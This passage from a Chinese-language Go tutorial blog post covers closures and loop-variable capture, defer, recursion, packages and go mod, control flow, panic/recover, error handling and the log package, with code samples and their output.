<p>注意两次调用F()，维护的不是同一个a变量。</p>
<p>3、</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   a := F()</span><br><span class="line">   a[<span class="number">0</span>]()<span class="comment">//0xc00004c080 3</span></span><br><span class="line">   a[<span class="number">1</span>]()<span class="comment">//0xc00004c080 3</span></span><br><span class="line">   a[<span class="number">2</span>]()<span class="comment">//0xc00004c080 3</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">F</span><span class="params">()</span> []<span class="title">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">   b := <span class="built_in">make</span>([]<span class="function"><span class="keyword">func</span><span class="params">()</span>, 3, 3)</span></span><br><span class="line">   <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line">      b[i] = <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">         fmt.Println(&amp;i,i)</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>闭包通过引用的方式使用外部函数的变量。例中只调用了一次函数F,构成一个闭包，i 在外部函数B中定义，所以闭包维护该变量 i ，a[0]、a[1]、a[2]中的 i 都是闭包中 i 的引用。因此执行,i 的值已经变为3，故再调用a<a href="">0</a>时的输出是3而不是0。</p>
<p>4、如何避免上面的BUG ，用下面的方法，注意和上面示例对比。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    a := F()</span><br><span class="line">    a[<span class="number">0</span>]() <span class="comment">//0xc00000a0a8 0</span></span><br><span class="line">    a[<span class="number">1</span>]() <span class="comment">//0xc00000a0c0 1</span></span><br><span class="line">    a[<span class="number">2</span>]() <span class="comment">//0xc00000a0c8 2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">F</span><span class="params">()</span> []<span class="title">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    b := <span class="built_in">make</span>([]<span class="function"><span class="keyword">func</span><span class="params">()</span>, 3, 3)</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line">        b[i] = (<span class="function"><span class="keyword">func</span><span class="params">(j <span class="keyword">int</span>)</span> <span class="title">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">                fmt.Println(&amp;j, j)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)(i)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    a := F()</span><br><span class="line">    a[<span class="number">0</span>]() <span class="comment">//0xc00004c080 0</span></span><br><span class="line">    a[<span class="number">1</span>]() <span class="comment">//0xc00004c088 1</span></span><br><span class="line">    a[<span class="number">2</span>]() <span class="comment">//0xc00004c090 2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">F</span><span class="params">()</span> []<span class="title">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    b := <span class="built_in">make</span>([]<span class="function"><span class="keyword">func</span><span class="params">()</span>, 3, 3)</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line">        j := i</span><br><span class="line">        b[i] = <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">            fmt.Println(&amp;j, j)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>每次 操作仅将匿名函数放入到数组中，但并未执行，并且引用的变量都是 i，随着 i 的改变匿名函数中的 i 也在改变，所以当执行这些函数时，他们读取的都是环境变量 i 最后一次的值。解决的方法就是每次复制变量 i 然后传到匿名函数中，让闭包的环境变量不相同。</p>
<p>5、</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   fmt.Println(F())<span class="comment">//2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">F</span><span class="params">()</span> <span class="params">(r <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">   <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">      r++</span><br><span class="line">   &#125;()</span><br><span class="line">   <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出结果为2，即先执行r=1 ,再执行r++。</p>
<p>6、递归函数</p>
<p>还有一种情况就是必须用都闭包，就是递归函数。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">F</span><span class="params">(i <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">   <span class="keyword">if</span> i &lt;= <span class="number">1</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> i * F(i<span class="number">-1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="keyword">var</span> i <span class="keyword">int</span> = <span class="number">3</span></span><br><span class="line">   fmt.Println(i, F(i))<span class="comment">// 3 6</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>7、斐波那契数列(Fibonacci)</p>
<p>这个数列从第3项开始，每一项都等于前两项之和。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fibonaci</span><span class="params">(i <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">1</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fibonaci(i<span class="number">-1</span>) + fibonaci(i<span class="number">-2</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> i <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;%d\n&quot;</span>, fibonaci(i))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>小结：</p>
<p>匿名函数和闭包其实是一回事儿，匿名函数就是闭包。匿名函数给编程带来灵活性的同时也容易产生bug，在使用过程当中要多注意函数的参数，及可接受的参数的问题。</p>
<h3 id="包"><a href="#包" class="headerlink" title="包"></a>包</h3><h4 id="本地包"><a href="#本地包" class="headerlink" title="本地包"></a>本地包</h4><p>go中模块可以用来导入到其他的包中，</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义了一个计算器模块</span></span><br><span class="line"><span class="comment">//首字母大写的函数或者变量可以被外部访问相当于public</span></span><br><span class="line"><span class="comment">//首字母小写的相当于private</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> calculator</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> logMessage = <span class="string">&quot;[LOG]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Version of the calculator</span></span><br><span class="line"><span class="keyword">var</span> Version = <span class="string">&quot;1.1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">internalSum</span><span class="params">(number <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> number - <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sum two integer numbers</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Sum</span><span class="params">(number1, number2 <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> number1 + number2</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>编写完之后使用 <code> go mod  init 给模块取个名字</code>，比如<code>go mod  init github.com/myuser/calculator</code></p>
<p>当前目录下会生成一个go.mod这里是相当于这个”计算器”包的依赖和环境类似py的requirements.txt</p>
<p>依赖然后就可以在main包中调用这个包,使用import</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/myuser/calculator&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	total := calculator.Sum(<span class="number">3</span>, <span class="number">5</span>)</span><br><span class="line">	fmt.Println(total)</span><br><span class="line">	fmt.Println(<span class="string">&quot;Version: &quot;</span>, calculator.Version)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后<code>go mod init helloworld</code>,然后生成了这个包的依赖</p>
<p>给go.mod增加几行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">require github.com/myuser/calculator v0.0.0</span><br><span class="line"></span><br><span class="line">replace github.com/myuser/calculator =&gt; ../calculator</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>调用本地包</p>
<h4 id="调用第三方包"><a href="#调用第三方包" class="headerlink" title="调用第三方包"></a>调用第三方包</h4><p>使用<code>go get　xxx</code>来进行第三方包的安装，go get的就是git clone和go install的两个命令的集合</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;rsc.io/quote&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(quote.Hello())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后<code>go run main.go</code>即可</p>
<p>有时可能需要重建依赖<code>go mod tidy</code></p>
<p><strong>vscode中如果导入了第三包出现飘红情况，是打开的文件路径不对，找到和当前项目go.mod所在的目录打开文件夹</strong></p>
<h3 id="流程控制语句"><a href="#流程控制语句" class="headerlink" title="流程控制语句"></a>流程控制语句</h3><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><p>if条件表达式可以不带小括号</p>
<p>但是大括号不能省略        </p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">somenumber</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-7</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> num := somenumber(); num &lt; <span class="number">0</span> &#123;</span><br><span class="line">        fmt.Println(num, <span class="string">&quot;is negative&quot;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> num &lt; <span class="number">10</span> &#123;</span><br><span class="line">        fmt.Println(num, <span class="string">&quot;has 1 digit&quot;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        fmt.Println(num, <span class="string">&quot;has multiple digits&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//这里会报错，因为在if语句块中定义的变量只能在if语句范围中使用，超过范围会报错</span></span><br><span class="line">    fmt.Println(num)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h4><p>在 Go 中，当逻辑进入某个 case 时，它会退出 <code>switch</code> 块（满足条件后退出switch块），除非你显式停止它。 </p>
<p>若要使逻辑进入到下一个紧邻的 case，请使用 <code>fallthrough</code> 关键字。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> num := <span class="number">15</span>; &#123;</span><br><span class="line">       <span class="comment">//case 可以编写条件</span></span><br><span class="line">    <span class="keyword">case</span> num &lt; <span class="number">50</span>:</span><br><span class="line">        fmt.Printf(<span class="string">&quot;%d is less than 50\n&quot;</span>, num)</span><br><span class="line">        <span class="keyword">fallthrough</span></span><br><span class="line">    <span class="keyword">case</span> num &gt; <span class="number">100</span>:</span><br><span class="line">        fmt.Printf(<span class="string">&quot;%d is greater than 100\n&quot;</span>, num)</span><br><span class="line">        <span class="keyword">fallthrough</span></span><br><span class="line">    <span class="keyword">case</span> num &lt; <span class="number">200</span>:</span><br><span class="line">        fmt.Printf(<span class="string">&quot;%d is less than 200&quot;</span>, num)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行代码并分析输出：</p>
<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">15 is less than 50</span><br><span class="line">15 is greater than 100</span><br><span class="line">15 is less than 200</span><br></pre></td></tr></table></figure>

<p>你是否看到错误？</p>
<p><strong>请注意，由于 <code>num</code> 为 15（小于 50），因此它与第一个 case 匹配。 但是，<code>num</code> 不大于 100。 由于第一个 <code>case</code> 语句包含 <code>fallthrough</code> 关键字，因此逻辑会立即转到下一个 <code>case</code> 语句，而不会对该 case 进行验证。 因此，在使用 <code>fallthrough</code> 关键字时必须谨慎。 该代码产生的行为可能不是你想要的。</strong></p>
<h4 id="for"><a href="#for" class="headerlink" title="for"></a>for</h4><p>最简例子</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    sum := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">100</span>; i++ &#123;</span><br><span class="line">        sum += i</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(<span class="string">&quot;sum of 1..100 is&quot;</span>, sum)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>随机数产生</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math/rand&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> num <span class="keyword">int32</span></span><br><span class="line">	sec := time.Now().Unix()</span><br><span class="line">	rand.Seed(sec)</span><br><span class="line">    <span class="comment">//等于while(1)</span></span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		fmt.Print(<span class="string">&quot;Writting inside the loop...&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> num = rand.Int31n(<span class="number">10</span>); num == <span class="number">5</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;finish!&quot;</span>)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Println(num)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>continue中规中矩没啥区别</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    sum := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> num := <span class="number">1</span>; num &lt;= <span class="number">100</span>; num++ &#123;</span><br><span class="line">        <span class="keyword">if</span> num%<span class="number">5</span> == <span class="number">0</span> &#123;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        sum += num</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(<span class="string">&quot;The sum of 1 to 100, but excluding numbers divisible by 5, is&quot;</span>, sum)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="defer-panic-recover"><a href="#defer-panic-recover" class="headerlink" title="defer panic recover"></a>defer panic recover</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">highlow</span><span class="params">(high <span class="keyword">int</span>, low <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> high &lt; low &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;Panic!&quot;</span>)</span><br><span class="line"><span class="comment">// panic可以理解成throw一个异常</span></span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">&quot;highlow() low greater than high&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//defer理解成一个堆栈，会在结束的时候逆向重新执行运行</span></span><br><span class="line">	<span class="keyword">defer</span> fmt.Println(<span class="string">&quot;Deferred: highlow(&quot;</span>, high, <span class="string">&quot;,&quot;</span>, low, <span class="string">&quot;)&quot;</span>)</span><br><span class="line">	fmt.Println(<span class="string">&quot;Call: highlow(&quot;</span>, high, <span class="string">&quot;,&quot;</span>, low, <span class="string">&quot;)&quot;</span>)</span><br><span class="line"></span><br><span class="line">	highlow(high, low+<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		handler := <span class="built_in">recover</span>()</span><br><span class="line">        <span class="comment">//recover可以理解成catch异常的信息，不显示具体的堆栈跟踪</span></span><br><span class="line">		<span class="comment">//如果没有任何错误捕捉到会返回nil</span></span><br><span class="line">        <span class="keyword">if</span> handler != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;main(): recover&quot;</span>, handler)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;()</span><br><span class="line">	highlow(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">	fmt.Println(<span class="string">&quot;Program finished successfully!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Call: highlow( 2 , 0 )</span><br><span class="line">Call: highlow( 2 , 1 )</span><br><span class="line">Call: highlow( 2 , 2 )</span><br><span class="line">Panic!</span><br><span class="line">Deferred: highlow( 2 , 2 )</span><br><span class="line">Deferred: highlow( 2 , 1 )</span><br><span class="line">Deferred: highlow( 2 , 0 )</span><br><span class="line">main(): recover highlow() low greater than high</span><br></pre></td></tr></table></figure>



<h3 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h3><h4 id="错误处理策略"><a href="#错误处理策略" class="headerlink" title="错误处理策略"></a>错误处理策略</h4><p>当函数返回错误时，该错误通常是最后一个返回值。 正如上一部分所介绍的那样，调用方负责检查是否存在错误并处理错误。 因此，一个常见策略是继续使用该模式在子例程中传播错误。 例如，子例程（如上一示例中的 <code>getInformation</code>）可能会将错误返回给调用方，而不执行其他任何操作，如下所示：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getInformation</span><span class="params">(id <span class="keyword">int</span>)</span> <span class="params">(*Employee, error)</span></span> &#123;</span><br><span class="line">    employee, err := apiCallEmployee(<span class="number">1000</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err <span class="comment">// Simply return the error to the caller.</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> employee, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>你可能还需要在传播错误之前添加更多信息。 为此，可以使用 <code>fmt.Errorf()</code> 函数，该函数与我们之前看到的函数类似，但它返回一个错误。 例如，你可以向错误添加更多上下文，但仍返回原始错误，如下所示：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getInformation</span><span class="params">(id <span class="keyword">int</span>)</span> <span class="params">(*Employee, error)</span></span> &#123;</span><br><span class="line">    employee, err := apiCallEmployee(<span class="number">1000</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;Got an error when getting the employee information: %v&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> employee, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>另一种策略是在错误为暂时性错误时运行重试逻辑。 例如，可以使用重试策略调用函数三次并等待两秒钟，如下所示：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getInformation</span><span class="params">(id <span class="keyword">int</span>)</span> <span class="params">(*Employee, error)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> tries := <span class="number">0</span>; tries &lt; <span class="number">3</span>; tries++ &#123;</span><br><span class="line">        employee, err := apiCallEmployee(<span class="number">1000</span>)</span><br><span class="line">        <span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> employee, <span class="literal">nil</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        fmt.Println(<span class="string">&quot;Server is not responding, retrying ...&quot;</span>)</span><br><span class="line">        time.Sleep(time.Second * <span class="number">2</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;server has failed to respond to get the employee information&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后，可以记录错误并对最终用户隐藏任何实现详细信息，而不是将错误打印到控制台。 我们将在下一模块介绍日志记录。 现在，让我们看看如何创建和使用自定义错误。</p>
<h4 id="创建可重用的错误"><a href="#创建可重用的错误" class="headerlink" title="创建可重用的错误"></a>创建可重用的错误</h4><p>有时错误消息数会增加，你需要维持秩序。 或者，你可能需要为要重用的常见错误消息创建一个库。 在 Go 中，你可以使用 <code>errors.New()</code> 函数创建错误并在若干部分中重复使用这些错误，如下所示：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义错误变量</span></span><br><span class="line"><span class="keyword">var</span> ErrNotFound = errors.New(<span class="string">&quot;Employee not found!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getInformation</span><span class="params">(id <span class="keyword">int</span>)</span> <span class="params">(*Employee, error)</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> id != <span class="number">1001</span> &#123;</span><br><span class="line">        <span class="comment">//使用错误变量</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, ErrNotFound</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    employee := Employee&#123;LastName: <span class="string">&quot;Doe&quot;</span>, FirstName: <span class="string">&quot;John&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> &amp;employee, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>getInformation</code> 函数的代码外观更优美，而且如果需要更改错误消息，只需在一个位置更改即可。 另请注意，惯例是为错误变量添加 <code>Err</code> 前缀。</p>
<p>最后，如果你具有错误变量，则在处理调用方函数中的错误时可以更具体。 <code>errors.Is()</code> 函数允许你比较获得的错误的类型，如下所示：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">employee, err := getInformation(<span class="number">1000</span>)</span><br><span class="line"><span class="comment">//errors.Is比较错误类型然后补充错误输出</span></span><br><span class="line"><span class="keyword">if</span> errors.Is(err, ErrNotFound) &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;NOT FOUND: %v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    fmt.Print(employee)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>你还需要了解何时使用 panic。 我们已介绍 <code>panic</code> 和 <code>recover</code> 的工作原理。 仅当明确需要停止程序时，才应使用这些函数。 有时，即使你正确处理了错误，程序也可能会停止响应。 但这应该是异常，而不是规则。</p>
<h3 id="log"><a href="#log" class="headerlink" title="log"></a>log</h3><h4 id="log包"><a href="#log包" class="headerlink" title="log包"></a>log包</h4><ul>
<li>fatal</li>
<li>print</li>
<li>painc</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    log.Print(<span class="string">&quot;Hey, I&#x27;m a log!&quot;</span>)</span><br><span class="line">    <span class="comment">//log.SetPrefix()。 可使用它向程序的日志消息添加前缀</span></span><br><span class="line">    log.SetPrefix(<span class="string">&quot;main(): &quot;</span>)</span><br><span class="line">    <span class="comment">//你可以使用 log.Fatal() 函数记录错误并结束程序，就像使用 os.Exit(1) 一样。</span></span><br><span class="line">    log.Fatal(<span class="string">&quot;Hey, I&#x27;m an error log!&quot;</span>)</span><br><span class="line">    <span class="comment">//  在使用 log.Panic() 函数时会出现类似行为，该函数也调用 panic() 函数</span></span><br><span class="line">    log.Panic(<span class="string">&quot;Hey, I&#x27;m an error log!&quot;</span>)</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">2021</span>/<span class="number">10</span>/<span class="number">18</span> <span class="number">09</span>:<span class="number">59</span>:<span class="number">58</span> Hey, I<span class="string">&#x27;m a log!</span></span><br><span class="line"><span class="string">main(): 2021/10/18 09:59:58 Hey, I&#x27;</span>m an error log!</span><br><span class="line">exit status <span class="number">1</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>记录到文件</p>
